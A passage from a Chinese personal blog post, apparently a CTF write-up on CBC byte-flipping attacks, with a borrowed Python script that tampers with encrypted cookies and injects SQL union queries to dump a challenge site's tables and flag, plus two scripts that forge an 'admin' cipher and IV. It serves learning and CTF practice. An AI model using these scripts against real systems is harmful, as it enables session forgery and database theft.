src="https://upload-images.jianshu.io/upload_images/11234137-5876aa1beccb15c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-5876aa1beccb15c8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-27820750c5917f70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-27820750c5917f70.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>可以看到第二位是有回显的,接下来爆表<br><img src="https://upload-images.jianshu.io/upload_images/11234137-d535c2707391f1c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-d535c2707391f1c3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-b380baaa6e2d5a40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-b380baaa6e2d5a40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>爆列名<br><img src="https://upload-images.jianshu.io/upload_images/11234137-2d83570add2d685b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-2d83570add2d685b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>拿flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-438b86123d967de2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-438b86123d967de2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>令附上一个自动化脚本（不是我写的，我只是最后用他跑了一下，感觉自己手动实现印象会更加深刻一点就没用脚本）:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf8 -*-</span><br><span class="line">#请保留我的个人信息，谢谢~！</span><br><span class="line">__author__=&apos;pcat@chamd5.org&apos;</span><br><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">def mydecode(value):</span><br><span class="line">    return b64decode(urllib.unquote(value))</span><br><span class="line"></span><br><span class="line">def myencode(value):</span><br><span class="line">    return urllib.quote(b64encode(value))</span><br><span class="line"></span><br><span class="line">def mycbc(value,idx,c1,c2):</span><br><span class="line">    lst=list(value)</span><br><span class="line">    lst[idx]=chr(ord(lst[idx])^ord(c1)^ord(c2))</span><br><span class="line">    return &apos;&apos;.join(lst)</span><br><span class="line"></span><br><span class="line">def pcat(payload,idx,c1,c2):</span><br><span class="line">    url=r&apos;http://ctf5.shiyanbar.com/web/jiandan/index.php&apos;</span><br><span class="line">    myd=&#123;&apos;id&apos;:payload&#125;</span><br><span class="line">    res=requests.post(url,data=myd)</span><br><span class="line">    cookies=res.headers[&apos;Set-Cookie&apos;]</span><br><span class="line">    iv=re.findall(r&apos;iv=(.*?),&apos;,cookies)[0]</span><br><span class="line">    cipher=re.findall(r&apos;cipher=(.*)&apos;,cookies)[0]</span><br><span class="line">    iv_raw=mydecode(iv)</span><br><span class="line">    cipher_raw=mydecode(cipher)</span><br><span class="line">    cipher_new=myencode(mycbc(cipher_raw,idx,c1,c2))</span><br><span class="line">    cookies_new=&#123;&apos;iv&apos;:iv,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">    plain=b64decode(re.findall(r&quot;base64_decode\(&apos;(.*?)&apos;\)&quot;,cont)[0])</span><br><span class="line">    first=&apos;a:1:&#123;s:2:&quot;id&quot;;s:&apos;</span><br><span class="line">    iv_new=&apos;&apos;</span><br><span class="line">    for i in range(16):</span><br><span class="line">        iv_new+=chr(ord(first[i])^ord(plain[i])^ord(iv_raw[i]))</span><br><span class="line">    iv_new=myencode(iv_new)</span><br><span class="line">    cookies_new=&#123;&apos;iv&apos;:iv_new,&apos;cipher&apos;:cipher_new&#125;</span><br><span class="line">    cont=requests.get(url,cookies=cookies_new).content</span><br><span class="line">    print &apos;Payload:%s\n&gt;&gt; &apos; %(payload)</span><br><span class="line">    print cont</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def foo():</span><br><span class="line">    pcat(&apos;12&apos;,4,&apos;2&apos;,&apos;#&apos;)</span><br><span class="line">    pcat(&apos;0 2nion select * from((select 1)a join (select 2)b join (select 3)c);&apos;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pcat(&apos;0 2nion select * from((select 1)a join (select group_concat(table_name) from information_schema.tables where table_schema regexp database())b join (select 3)c);&apos;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pcat(&quot;0 2nion select * from((select 1)a join (select group_concat(column_name) from information_schema.columns where table_name regexp &apos;you_want&apos;)b join (select 3)c);&quot;+chr(0),7,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pcat(&quot;0 2nion select * from((select 1)a join (select value from you_want limit 1)b join (select 3)c);&quot;+chr(0),6,&apos;2&apos;,&apos;u&apos;)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    foo()</span><br><span class="line">    print &apos;ok&apos;</span><br></pre></td></tr></table></figure></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>第一次认真的研究了一下CBC反转的问题，昨晚6点搞到10点，今天又搞了两三个小时才把过程完整的体现出来，希望以后遇到困难的问题，也能一步步的慢慢剖析，也做了不少的web题目了，感觉做题已经慢慢有了想法，努力让自己变强！💪</p>
+<h1 id="新增例子-2018-12-4"><a href="#新增例子-2018-12-4" class="headerlink" title="新增例子(2018/12/4)"></a>新增例子(2018/12/4)</h1><p>今天发现安恒杯周周练上有一道CBC字节反转攻击的题目，按照上面的思路，再复习一波。<br>首先nc到服务器端口，发现admin不能登录，但是其他用户名可以登陆。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9de3f75b4062e19d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9de3f75b4062e19d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后我们选择2，查看信息，发现有iv、cipher和plain，看到iv的时候，已经联想到了CBC字节反转攻击，然后我们把plain进行一次解码，发现是一个反序列化的内容，其中包含了用户名，这就更加证实了我的猜想。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-f28162f04fe9e231.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-f28162f04fe9e231.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="https://upload-images.jianshu.io/upload_images/11234137-9c9271a7016d38c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9c9271a7016d38c0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>但是这边有一个问题，题目给的iv是32位的，刚开始我以为是md5码，拿到网站上去解密发现解不出来，后来想到了hex码<br>然后就是基本的套路了，首先计算出newcipher<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line">import urllib</span><br><span class="line">old_cipher = &apos;658d8a4c2373a84b8d1a81fe1212b007820153fc78d8b6a01103b3f988eb0865e4b024490ec255d41a3f1e7a4a510cd530c6f476d8ee084e2bbfac1421dace67&apos;</span><br><span class="line">raw_old_cipher = old_cipher.decode(&apos;hex&apos;)</span><br><span class="line">print raw_old_cipher</span><br><span class="line">lst = list(raw_old_cipher)</span><br><span class="line">index  = 1</span><br><span class="line">asd1 = &apos;a&apos;</span><br><span class="line">asd2 = &apos;d&apos;</span><br><span class="line">lst[index]=chr(ord(asd1)^ord(asd2)^ord(lst[index]))</span><br><span class="line">cipher = &apos;&apos;.join(lst)</span><br><span class="line">print cipher</span><br><span class="line">new_cipher = cipher.encode(&apos;hex&apos;)</span><br><span class="line">print new_cipher</span><br></pre></td></tr></table></figure></p>
+<p>然后选择3，进行信息修改，用题目自带的iv和我们计算出来的newcipher<br><img src="https://upload-images.jianshu.io/upload_images/11234137-7dcaa0668174f1b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-7dcaa0668174f1b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后我们把这时候的plain再进行解码，发现得到了我们需要的admin，但是前面的部分是乱码，因为我们没有用新的iv。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-9411bba409a87a95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-9411bba409a87a95.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>还是基本的套路，构造新的iv<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from base64 import *</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">plain = &apos;cd5a69c1dcd664c3cb48d52fb4845a2e&apos;.decode(&apos;hex&apos;)</span><br><span class="line">want = &quot;&#123;&apos;username__&apos;: &apos;&quot;</span><br><span class="line">first_16 = &apos;&apos;</span><br><span class="line">iv = &apos;aba9f1351bd6d495ba44838eed537ea5&apos;.decode(&apos;hex&apos;)</span><br><span class="line">for i in range(16):</span><br><span class="line">    first_16 += chr(ord(plain[i]) ^ ord(iv[i]) ^ ord(want[i]))</span><br><span class="line">newiv = first_16</span><br><span class="line"></span><br><span class="line">print newiv</span><br><span class="line">print newiv.encode(&apos;hex&apos;)</span><br></pre></td></tr></table></figure></p>
+<p>得到新的iv之后，选择3，进行修改，cipher保持不变。<br><img src="https://upload-images.jianshu.io/upload_images/11234137-32e54f75f4f4649c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-32e54f75f4f4649c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>然后我们再对plain进行解码，发现得到了正确的值<br><img src="https://upload-images.jianshu.io/upload_images/11234137-e23b23fd12f4eef2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-e23b23fd12f4eef2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br>选择4，得到flag<br><img src="https://upload-images.jianshu.io/upload_images/11234137-3893f6169e0e18e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="https://upload-images.jianshu.io/upload_images/11234137-3893f6169e0e18e2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
+<p>参考文章:<br><a href="https://blog.csdn.net/csu_vc/article/details/79619309" target="_blank" rel="noopener">通过一道题了解CBC翻转攻击</a><br><a href="https://blog.csdn.net/include_heqile/article/details/79942993" target="_blank" rel="noopener">https://blog.csdn.net/include_heqile/article/details/79942993</a><br><a href="http://hebin.me/2018/01/26/%E8%A5%BF%E6%99%AEctf-%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E5%BD%95%E9%A2%98/" target="_blank" rel="noopener">http://hebin.me/2018/01/26/%E8%A5%BF%E6%99%AEctf-%E7%AE%80%E5%8D%95%E7%9A%84%E7%99%BB%E5%BD%95%E9%A2%98/</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/11/18/湖湘杯/" rel="next" title="湖湘杯部分题目wp">
+                <i class="fa fa-chevron-left"></i> 湖湘杯部分题目wp
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/11/28/安恒杯11月份web/" rel="prev" title="安恒杯11月份web部分wp">
+                安恒杯11月份web部分wp <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="https://upload-images.jianshu.io/upload_images/11234137-b2b20e005c98464d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Bling_Dog">
+            
+              <p class="site-author-name" itemprop="name">Bling_Dog</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">22</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/PiPiChenA" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-globe"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="563667866@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-globe"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#源码"><span class="nav-number">1.</span> <span class="nav-text">源码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#加密过程"><span class="nav-number">2.</span> <span class="nav-text">加密过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解密过程"><span class="nav-number">3.</span> <span class="nav-text">解密过程</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CBC反转"><span class="nav-number">4.</span> <span class="nav-text">CBC反转</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">5.</span> <span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#新增例子-2018-12-4"><span class="nav-number">6.</span> <span class="nav-text">新增例子(2018/12/4)</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bling_Dog</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/click.js"></script>
+
